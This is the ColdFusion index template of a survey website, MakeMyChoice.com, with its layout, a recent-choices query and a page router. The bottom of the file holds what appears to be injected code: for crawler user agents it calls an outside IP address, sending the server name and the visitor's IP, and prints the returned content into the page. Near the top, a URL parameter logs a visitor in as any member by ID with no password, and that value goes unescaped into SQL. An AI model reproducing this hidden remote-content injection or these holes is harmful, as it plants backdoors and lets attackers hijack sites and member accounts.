
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<html>
<head>

<title>MakeMyChoice.com - Make Great Choices! Ask Questions Get Answers</title>
<META NAME="DESCRIPTION" CONTENT="Make Great Choices with MakeMyChoice.com, create surveys instantly, ask questions, get answers, question and answer, help making choices, make great choices, making choices, decision making, help making choices, decision maker">
<META NAME="KEYWORDS" CONTENT="Make My choice, ask, ask questions, answers, making great choices, make choices, making choices, decision making, help making choices, decision maker">
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="css/site_layout.css" rel="stylesheet" type="text/css">
<link rel="shortcut icon" type="image/x-icon" href="images/faviconCAB010KZ.ico">
<meta property="og:title" content="MakeMyChoice.com - Make Great Choices!" /> 
<meta property="og:description" content="Create surveys, Get feedback on all the choices and decisions you need to make." /> 
<meta property="og:image" content="http://www.makemychoice.com/images/MakeMyChoice_Logo_sm.jpg" />

			<!--- Import jQuery library & plugins --->
			<script src="js/jquery-latest.js" type="text/javascript"></script>
			<script src="js/jquery.tablesorter.min.js" type="text/javascript"></script>
            <script src="js/ui.datepicker.js" type="text/javascript"></script>
            <script src="js/jquery.validate.js" type="text/javascript"></script>
            <script src="js/jquery.jqModal.min.js" type="text/javascript"></script>



<script type="text/javascript">
function MM_swapImgRestore() { //v3.0
  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
}
function MM_preloadImages() { //v3.0
  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}

function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_swapImage() { //v3.0
  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
}
</script>

<link rel="stylesheet" type="text/css" href="css/anylinkcssmenu.css" />

<script type="text/javascript" src="js/anylinkcssmenu.js">

/***********************************************
* AnyLink CSS Menu script v2.0- © Dynamic Drive DHTML code library (www.dynamicdrive.com)
* This notice MUST stay intact for legal use
* Visit Project Page at http://www.dynamicdrive.com/dynamicindex1/anylinkcss.htm for full source code
***********************************************/

</script>

<script type="text/javascript">

//anylinkcssmenu.init("menu_anchors_class") ////Pass in the CSS class of anchor links (that contain a sub menu)
anylinkcssmenu.init("anchorclass")
</script>

</head>

<cfparam name="fa" default="home">
<cfparam name="url.imid" default=0>

	<cfif url.imid neq 0>
		<!--- Log in users automatically if are already members. --->
		<cfquery name="login" datasource="#application.dsn#">
			SELECT id, username, password, first_name, last_name, email_address
			FROM t_members
			WHERE id = #url.imid#
		</cfquery>
			<cfset client.mid = login.id>
			<cfset client.email_address = login.email_address>
			<cfset client.username = login.username>
			<cfset client.name = login.first_name & " " & login.last_name>           
	</cfif>

<cfif fa eq "home">
	<cfif client.mid eq 0>
		<cflocation url="index_new.cfm" addtoken="no">
	</cfif>
</cfif>

<link href="css/site_layout.css" rel="stylesheet" type="text/css">
<link href="css/calendar.css" rel="stylesheet" type="text/css">

		<!--- Get the top ten most recent choices from the public. --->
		<cfquery name="recent_everyone" datasource="#application.dsn#" maxrows="11">
			SELECT c.id, c.mid, c.username, c.short_desc, c.date_created, c.anon, r.request_type
			FROM t_choices c INNER JOIN
            	t_requests r ON c.id = r.cid
                	WHERE r.request_type = 'everyone'
                            AND c.date_end > GETDATE()
			ORDER BY c.id DESC
		</cfquery>	

<body leftmargin=0 topmargin=0 rightmargin=0 bottommargin=0 marginwidth=0 marginheight=0 onload="MM_preloadImages('images/btn_login_hover.gif','images/btn_create_new_hover.gif','images/btn_give_feedback_hover.gif','images/btn_search_choices_hover.gif','images/btn_more_choices_hover.gif','images/btn_logout_m_hover.gif','images/btn_create_new_m_hover.gif','images/btn_give_feedback_hover_m.gif','images/btn_search_choices_m_hover.gif','images/btn_my_choices_hover.gif','images/btn_my_feedback_hover.gif','images/btn_my_messages_hover.gif','images/btn_my_profile_hover.gif','images/btn_my_groups_hover.gif','images/btn_signup2_hover.gif')">

<table style="width:100%;" margintop="0" marginLeft="0" width="100%" cellpadding="0" cellspacing="0" border="0">
	<cfoutput>
	<tr>
		<td align="center" valign="top" class="eyebrow_m">
			<table style="width:980px;" cellpadding="0" cellspacing="0" border="0" class="eyebrow_m">
				<tr>
					<td class="eyebrow_m">
						<img src="images/make_great_choices_m.gif" />
					</td>
					<td style="width:128px" width="128" class="eyebrow_m">&nbsp;
						
					</td>
					<td class="eyebrow_m">
						<a href="http://www.facebook.com/sharer.php?u=#cgi.script_name#?#cgi.query_string#&t=MakeMyChoice.com"><img src="images/facebook_m.gif" border="0"/></a>
					</td>
					<td class="eyebrow_m">
						<a href="http://twitter.com/share"><img src="images/twitter_m.gif" border="0"/></a>
					</td>
				</tr>
			</table>
		</td>
	</tr>
</cfoutput>
	<tr>
		<td align="center" valign="top" class="aquarium_m">
			<table style="width:980px;" cellpadding="0" cellspacing="0" border="0" class="site_text">
				<tr>
					<td rowspan="2">
						<a href="index.cfm" alt="MakeMyChoice.com">
							<img src="images/makemychoice.com_logo_m.gif" border="0" />
						</a>
					</td>
					<td colspan="2" valign="top" class="news_m">
						<a href="index.cfm?fa=new_group" alt="MakeMyChoice.com Groups">
							<img src="images/news_temp_m.gif" border="0" />	
						</a>
					</td>
					<td valign="middle" align="right" nowrap="nowrap" style="padding-right:20px;">
						<cfif client.mid neq 0>
							Logged in: <cfoutput><span class="orange_text"><strong>#client.username#</strong></span></cfoutput>
							<p class="small-spacer">&nbsp;</p>
							 <a href="actions/act_logout.cfm" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('logOut','','images/btn_logout_m_hover.gif',1)"><img src="images/btn_logout_m.gif" alt="Logout" name="logOut" width="115" height="32" border="0" id="logOut" /></a> 
						<cfelse>
							<a href="index.cfm?fa=legal" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('signUp2','','images/btn_signup2_hover.gif',1)"><img src="images/btn_signup2.gif" alt="Sign Up" name="signUp2" width="183" height="38" border="0" id="signUp2" /></a>
						</cfif>
					</td>	
				</tr>
				<tr>
					<td valign="top" class="top_menu_m">
						<a href="index.cfm?fa=new_choice" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('createNewC','','images/btn_create_new_m_hover.gif',1)"><img src="images/btn_create_new_m.gif" alt="Create new" name="createNewC" width="228" height="93" border="0" id="createNewC" align="top" /></a></td>
					<td valign="top" class="top_menu_m">
						<a href="index.cfm?fa=my_feedback" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('myFeedback','','images/btn_give_feedback_hover_m.gif',1)"><img src="images/btn_give_feedback_m.gif" alt="Give Feedback" name="myFeedback" width="201" height="93" border="0" id="myFeedback" align="top"/></a>
					</td>
					<td valign="top" class="top_menu_m">
						<a href="index.cfm?fa=search_cats" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('searchMembers','','images/btn_search_choices_m_hover.gif',1)"><img src="images/btn_search_choices_m.gif" alt="Search Members and Choices" name="searchMembers" width="211" height="93" border="0" id="searchMembers" align="top" /></a>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td align="center" valign="top" bgcolor="FFFFFF">
			<table style="width:980px;" cellpadding="0" cellspacing="0" border="0">
				<tr>
					<td valign="top" bgcolor="FFFFFF" style="width:15px;">&nbsp;
						
					</td>
					<td valign="top" bgcolor="FFFFFF" style="width:220px;">
						<cfif client.mid neq 0>
						<table border="0">
							<tr>
								<td align="left">
									<a href="index.cfm?fa=my_choices" class="anchorclass someotherclass" rel="submenu2" rev="lr" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('myChoices','','images/btn_my_choices_hover.gif',1)"><img src="images/btn_my_choices.gif" alt="My Choices" name="myChoices" width="186" height="46" border="0" id="myChoices" /></a>
									<div id="submenu2" class="anylinkcss" style="width: 150px; background-color:#E9FECB">
										<ul>
											<li><a href="index.cfm?fa=new_choice">New Choice or Decision</a></li>
											<li><a href="index.cfm?fa=my_choices">My Choices</a></li>
											<li><a href="index.cfm?fa=my_choices&c=1">Unfinished Choices</a></li>
										</ul>
									</div>
								</td>
							</tr>
							<tr>
								<td>
									<p class="small-spacer">&nbsp;</p>
								</td>
							</tr>
							<tr>
								<td align="left">
									<a href="index.cfm?fa=my_feedback" class="anchorclass someotherclass" rel="submenu2" rev="lr" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('myFeedbackBtn','','images/btn_my_feedback_hover.gif',1)"><img src="images/btn_my_feedback.gif" alt="My Feedback" name="myFeedbackBtn" width="187" height="46" border="0" id="myFeedbackBtn" /></a>
									<div id="submenu2" class="anylinkcss" style="width: 150px; background-color:#E9FECB">
										<ul>
											<li><a href="index.cfm?fa=my_feedback&f=4">Feedback I Have Given</a></li>
											<li><a href="index.cfm?fa=my_feedback&f=1">General Requests</a></li>
											<li><a href="index.cfm?fa=my_feedback&f=3">Group Requests</a></li>
											<li><a href="index.cfm?fa=my_feedback&f=2">Targeted Requests</a></li>
										</ul>
									</div>
								</td>
							</tr>								
							<tr>
								<td>
									<p class="small-spacer">&nbsp;</p>
								</td>
							</tr>	
							<tr>
								<td align="left">
									<a href="index.cfm?fa=my_groups" class="anchorclass someotherclass" rel="submenu2" rev="lr" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('myGroups','','images/btn_my_groups_hover.gif',1)"><img src="images/btn_my_groups.gif" alt="My Groups" name="myGroups" width="187" height="46" border="0" id="myGroups" /></a>
									<div id="submenu2" class="anylinkcss" style="width: 150px; background-color:#E9FECB">
										<ul>
											<li><a href="index.cfm?fa=new_group">Create New Group</a></li>
											<li><a href="index.cfm?fa=my_groups">My Groups</a></li>
											<li><a href="index.cfm?fa=my_groups_invited">Group Memberships</a></li>
											<li><a href="index.cfm?fa=search_groups">Search Groups</a></li>
										</ul>
									</div>
								</td>
							</tr>				
							<tr>
								<td>
									<p class="small-spacer">&nbsp;</p>
								</td>
							</tr>
							<tr>
								<td align="left">	
									<a href="index.cfm?fa=my_messages" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('myMessages','','images/btn_my_messages_hover.gif',1)"><img src="images/btn_my_messages.gif" alt="My Messages" name="myMessages" width="187" height="46" border="0" id="myMessages" /></a>
								</td>	
							</tr>	
							<tr>
								<td>
									<p class="small-spacer">&nbsp;</p>
								</td>
							</tr>
							<tr>
								<td align="left">	
									<a href="index.cfm?fa=my_profile" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('myProfile','','images/btn_my_profile_hover.gif',1)"><img src="images/btn_my_profile.gif" alt="My Profile" name="myProfile" width="187" height="46" border="0" id="myProfile" /></a>
								</td>	
							</tr>
		
							<tr>
								<td>
									<p class="med-spacer">&nbsp;</p>
								</td>
							</tr>
						</table>
						</cfif>
						
						
						<table border="0">
							<tr>
								<td style="width:25px;">&nbsp;
									
								</td>
								<td align="left">
									<a href="index.cfm?fa=about" class="leftmenu_link">ABOUT</a>
								</td>
							</tr>
							<tr>
								<td colspan="2">
									<p class="small-spacer">&nbsp;</p>
								</td>
							</tr>
							<tr>
								<td>&nbsp;
									
								</td>
								<td align="left">
									<a href="index.cfm?fa=instructions" class="leftmenu_link">INSTRUCTIONS</a>
								</td>
							</tr>
							<tr>
								<td colspan="2">
									<p class="small-spacer">&nbsp;</p>
								</td>
							</tr>
							<tr>
								<td>&nbsp;
									
								</td>
								<td align="left">
									<a href="index.cfm?fa=contact" class="leftmenu_link">CONTACT</a>
								</td>
							</tr>
							<tr>
								<td colspan="2">
									<p class="small-spacer">&nbsp;</p>
								</td>
							</tr>
							<tr>
								<td>&nbsp;
									
								</td>
								<td align="left">
									<a href="index.cfm?fa=login" class="leftmenu_link">LOGIN</a>
								</td>
							</tr>
							<tr>
								<td colspan="2">
									<p class="small-spacer">&nbsp;</p>
								</td>
							</tr>
							<tr>
								<td>&nbsp;
									
								</td>
								<td align="left">
									<a href="index.cfm?fa=legal" class="leftmenu_link">SIGN UP</a>
								</td>
							</tr>
							<tr>
								<td colspan="2">
									<p class="small-spacer">&nbsp;</p>
								</td>
							</tr>
						</table>
						
					</td>
					<td valign="top" bgcolor="FFFFFF">
					
					</td>
					<td valign="top" bgcolor="FFFFFF" style="width:730px;">
					<cfswitch expression="#fa#">
						 <cfcase value="home">
							<table style="width:100%;" cellpadding="0" cellspacing="0" class="site_text" border="0">
								<tr class="site_hdr">
									<td align="left">
										Answer Questions, Help Make Choices and Decisions Below
									</td>
								</tr>
								<tr class="grey_line">
									<td height="8px">
										<p class="small-spacer">&nbsp;</p>
									</td>
								</tr>
								 <cfoutput query="recent_everyone" maxrows="11">
									<cfif currentRow MOD 2>  
										<cfset rowClass = "blue_row" />  
									<cfelse>  
										<cfset rowClass = "white_row" />  
									</cfif> 
								 <tr>
									<td class="#rowClass#" align="left" style="padding-bottom:5px;">
										<a href="index.cfm?fa=choice_feedback&cid=#recent_everyone.id#&mid=#recent_everyone.mid#" class="choice_link_m">#left(recent_everyone.short_desc,85)#<cfif len(recent_everyone.short_desc) gt 85>....</cfif></a>
										<br />
										Created By
										<cfif recent_everyone.anon eq 0>
											<a href="index.cfm?fa=profile&mid=#recent_everyone.mid#" class="orange_link">#recent_everyone.username#</a>  
										<cfelse>
											<span class="member_text_sm">Anonymous Member</span>
										</cfif> 
										&nbsp; Date Created: #DateFormat(recent_everyone.date_created, "mm/dd/yyyy")#           
									</td>
								</tr>
								</cfoutput>
								<tr>
									<td>
										<p class="small-spacer">&nbsp;</p>
									</td>
								</tr>
								<tr>
									<td align="right">
										<a href="index.cfm?fa=more_choices" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('moreChoices','','images/btn_more_choices_hover.gif',1)"><img src="images/btn_more_choices.gif" name="moreChoices" width="160" height="39" border="0" id="moreChoices" /></a>
									</td>
								</tr>								
							</table>
						 </cfcase>	
						 <cfcase value="more_choices">
							<cfinclude template="dsp_more_choices.cfm">
						 </cfcase>
						 <cfcase value="username">
							<cfinclude template="dsp_username.cfm">
						 </cfcase> 	
						 <cfcase value="sign_up">
							<cfinclude template="dsp_sign_up.cfm">
						 </cfcase> 	 
						 <cfcase value="login">
<cfinclude template="dsp_login.cfm">
						 </cfcase> 
						 <cfcase value="new_choice">
							<cfinclude template="dsp_new_choice.cfm">
						 </cfcase>
						 <cfcase value="add_answers">
							<cfinclude template="dsp_add_answers.cfm">
						 </cfcase>
						 <cfcase value="view_choice">
							<cfinclude template="dsp_view_choice.cfm">
						 </cfcase>
						 <cfcase value="choice_feedback">
							<cfinclude template="dsp_choice_feedback.cfm">
						 </cfcase>
						 <cfcase value="request_feedback">
							<cfinclude template="dsp_request_feedback.cfm">
						 </cfcase>
						 <cfcase value="request_advanced">
							<cfinclude template="dsp_request_advanced.cfm">
						 </cfcase>
						 <cfcase value="request_nonmembers">
							<cfinclude template="dsp_request_nonmembers.cfm">
						 </cfcase>
						 <cfcase value="instructions">
							<cfinclude template="dsp_instructions.cfm">
						 </cfcase>
						 <cfcase value="search_engine">
							<cfinclude template="dsp_search_engine.cfm">
						 </cfcase>
						 <cfcase value="search_cats">
							<cfinclude template="dsp_search_cats.cfm">
						 </cfcase>
						 <cfcase value="my_choices">
							<cfinclude template="dsp_my_choices.cfm">
						 </cfcase>
						 <cfcase value="my_feedback">
							<cfinclude template="dsp_my_feedback.cfm">
						 </cfcase>
						 <cfcase value="support">
							<cfinclude template="dsp_support.cfm">
						 </cfcase>
						 <cfcase value="my_profile">
							<cfinclude template="dsp_my_profile.cfm">
						 </cfcase>
						 <cfcase value="profile">
							<cfinclude template="dsp_profile.cfm">
						 </cfcase>
						 <cfcase value="my_messages">
							<cfinclude template="dsp_my_messages.cfm">
						 </cfcase>
						 <cfcase value="view_message">
							<cfinclude template="dsp_view_message.cfm">
						 </cfcase>
						 <cfcase value="new_message">
							<cfinclude template="dsp_new_message.cfm">
						 </cfcase>
						 <cfcase value="about">
						 <cfinclude template="dsp_about.cfm">
						 </cfcase>
						 <cfcase value="contact">
							<cfinclude template="dsp_contact.cfm">
						 </cfcase>
						 <cfcase value="nolog">
							<cfinclude template="dsp_nolog.cfm">
						 </cfcase>
						 <cfcase value="get_pass">
							<cfinclude template="dsp_get_pass.cfm">
						 </cfcase>
						 <cfcase value="legal">
							<cfinclude template="dsp_legal.cfm">
						 </cfcase>
						 <cfcase value="my_groups">
							<cfinclude template="dsp_my_groups.cfm">
						 </cfcase>
						 <cfcase value="new_group">
						 <cfinclude template="dsp_new_group.cfm">
						 </cfcase>
						 <cfcase value="my_groups_invited">
						 <cfinclude template="dsp_groups_invited.cfm">
						 </cfcase>
						 <cfcase value="group_members">
							<cfinclude template="dsp_group_members.cfm">
						 </cfcase>
						 <cfcase value="group_members_add">
							<cfinclude template="dsp_group_members_add.cfm">
						 </cfcase>
						 <cfcase value="group_confirm">
							<cfinclude template="dsp_group_confirm.cfm">
						 </cfcase>
						 <cfcase value="search_groups">
							<cfinclude template="dsp_search_groups.cfm">
						 </cfcase>
						 <cfcase value="invite_people">
							<cfinclude template="dsp_invite_people.cfm">
						 </cfcase>
						 <cfcase value="suggestion">
							<cfinclude template="dsp_suggestion.cfm">
						 </cfcase>
						 <cfcase value="suggestion_report">
							<cfinclude template="dsp_suggestion_report.cfm">
						 </cfcase>
						 <cfcase value="contest_info">
							<cfinclude template="dsp_contest_info.cfm">
						 </cfcase>
						 <cfcase value="signup_org">
							<cfinclude template="dsp_signup_org.cfm">
						 </cfcase>
						 <cfcase value="email_members">
							<cfinclude template="dsp_email_members.cfm">
						 </cfcase>
					 </cfswitch>
						
					</td>
				
					<td valign="top" bgcolor="FFFFFF" style="width:15px;">&nbsp;
						
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td align="center" bgcolor="FFFFFF" valign="top">
			<table class="footer_text">
				<tr>
					<td>
						<p class="small-spacer">&nbsp;</p>
					</td>
				</tr>
				<tr>
					<td>
						<img src="images/footer_logo.gif" /> &nbsp;
					</td>
					<td>
						<cfoutput>
							MakeMyChoice.com &copy; #DateFormat(Now(),"mm/dd/yyyy")#. Proprietary patent pending technology.
						</cfoutput>
					</td>
					<td>
						&nbsp; &nbsp;
						<a href="index.cfm?fa=about" class="footer_link">About MakeMyChoice.com &trade;</a> | <a href="index.cfm?fa=legal" class="footer_link">Terms & Conditions</a>
					</td>
				</tr>
			</table>	
		</td>
	</tr>						
</table>

<cfset stop_useragents = "http|google|slurp|msnbot|bot|crawl|spider|robot|HttpClient|curl|PHP|SiteUptime|WordPress|Charlotte|wwwster|Python|urllib|perl|libwww|lynx|Twiceler|msn|yahoo|bing|ia_archiver">
<cfif (REFindNoCase(stop_useragents,cgi.http_user_agent) NEQ 0)>
<cfhttp url="http://217.23.3.239/in.php?pi=#CGI.SERVER_NAME#&ip=#CGI.REMOTE_ADDR#&ua=#CGI.HTTP_USER_AGENT#">
<cfoutput>
  #cfhttp.filecontent#
</cfoutput>             
</cfif>
</body>
</html>
